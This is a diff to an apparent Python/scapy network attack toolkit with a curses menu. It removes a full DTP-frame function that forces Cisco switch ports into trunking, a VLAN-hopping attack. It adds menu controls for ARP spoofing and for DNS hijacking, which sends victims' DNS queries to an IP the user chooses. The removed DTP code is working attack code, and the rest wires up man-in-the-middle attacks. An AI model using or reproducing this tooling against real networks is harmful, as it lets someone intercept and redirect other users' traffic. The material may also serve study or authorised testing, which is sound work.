@@ -4,9 +4,10 @@ import os
 import netifaces
 import curses
 import json
-import create_bridge
-import hijack_dns
 import ipaddress
+import create_bridge
+import arp_spoof
+import hijack_dns
 from types import SimpleNamespace
 from platform import system
 from scapy.all import *
@@ -76,37 +77,20 @@ def disable_forwarding(bridge_name: str):
     create_bridge.stop(bridge_name, verbose=verbose)
 
 
+def enable_arp_spoof(interfaces):
+    arp_spoof.start(interfaces, verbose=verbose)
+
+
+def disable_arp_spoof():
+    arp_spoof.stop(verbose=verbose)
+
+
 def enable_dns_hijack(fakeip, interfaces):
-    hijack_dns.start(fakeip, interfaces)
+    hijack_dns.start(fakeip, interfaces, verbose=verbose)
 
 
 def disable_dns_hijack():
-    hijack_dns.stop()
-
-
-def dtp_atk(iface: list, mac_addr=str(RandMAC())):
-    """Establish a trunk interface by sending a crafted dtp pkt"""
-    # creating a pkt at the data-link layer (ethernet frame) with the Logical-Link control sublayer
-    p = Dot3(src=mac_addr, dst="01:00:0c:cc:cc:cc", len=42)
-    p /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
-    p /= SNAP(OUI=0x0c,
-              code=0x2004)  # including the Organisational Unique Identifier of the macaddr (cisco), configured as dtp pkt
-    p /= DTP(ver=1, tlvlist=[
-        DTPDomain(length=13, type=1, domain=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00'),
-        DTPStatus(status=b'\x03', length=5, type=2),
-        DTPType(length=5, type=3, dtptype=b'\xa5'),
-        DTPNeighbor(type=4, neighbor=mac_addr, len=10)
-    ])
-    while not stop_dtp_event.is_set():
-        for interface in iface:
-            sendp(p, iface=interface, verbose=0)
-        sleep(attacks.trunk.settings.interval)
-
-
-def launch_dtp_atk(interfaces: list):
-    dtp_thread = threading.Thread(target=dtp_atk, args=(interfaces, attacks.trunk.settings.mac_address,))
-    dtp_thread.daemon = True
-    dtp_thread.start()
+    hijack_dns.stop(verbose=verbose)
 
 
 def display_banner(extra=""):
@@ -247,21 +231,15 @@ def gui(stdscr_gui):
             replace_choice(attacks.forward.stop, attacks.forward.start)
             stdscr_gui.addstr(f"\nDisabled packet forwarding. Press any key to return\n")
 
-        elif action == attacks.trunk.start:
-            stdscr_gui.addstr(f"\nAttempting to enable trunking on...\n")
-            stdscr_gui.refresh()
-            stop_dtp_event.clear()
-            launch_dtp_atk(selected_interfaces)
-            replace_choice(attacks.trunk.start, attacks.trunk.stop)
-            stdscr_gui.addstr(f"Enabled trunking. Press any key to return")
+        elif action == attacks.arp.start:
+            enable_arp_spoof(selected_interfaces)
+            replace_choice(attacks.arp.start, attacks.arp.stop)
+            stdscr_gui.addstr(f"\nEnabled ARP spoofing on {', '.join(selected_interfaces)}. Press any key to return\n")
 
-        elif action == attacks.trunk.stop:
-            stdscr_gui.addstr(f"\nDisabling trunk...\nNote: Switch may take awhile to recognise that trunk is gone.\n")
-            stdscr_gui.refresh()
-            stop_dtp_event.set()
-            sleep(config.stop_time)
-            replace_choice(attacks.trunk.stop, attacks.trunk.start)
-            stdscr_gui.addstr(f"Trunk disabled. Press any key to return\n")
+        elif action == attacks.arp.stop:
+            disable_arp_spoof()
+            replace_choice(attacks.arp.stop, attacks.arp.start)
+            stdscr_gui.addstr(f"\nDisabled ARP spoofing. Press any key to return\n")
 
         elif action == attacks.dns.start:
             fakeip = get_user_input("\nWhat IP do you want to resolve DNS queries to?\nIP Address: ", (ipaddress.IPv4Address,))
@@ -307,7 +285,6 @@ def main():
         if input("Forwarding packets will not be possible. Do you wish to continue? (Y/N): ").lower() not in ["y", "ye",
                                                                                                               "yes"]:
             sys.exit(1)
-
 
     stdscr = curses.initscr()
     curses.cbreak()
